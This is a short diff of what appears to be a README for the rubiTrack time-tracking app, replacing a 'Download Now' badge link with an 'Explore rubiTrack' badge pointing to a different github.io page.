@@ -4,7 +4,7 @@
 <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSbuHCpP-i1OoaGg1oe4LCTRHptpEntK9-wzw&s" alt="rubiTrack Icon" width="256" height="256">  
 </div>  
 
-[![Download Now](https://img.shields.io/badge/Download_Now-steelblue?style=for-the-badge&logo=arma)](https://zilkaflerayat.github.io/.github/rubiTrack-time-tracking)
+[![Explore rubiTrack](https://img.shields.io/badge/Explore-rubiTrack-B91C1C?style=plastic)](https://rubitrack.github.io/.github/)
 
 ---
 
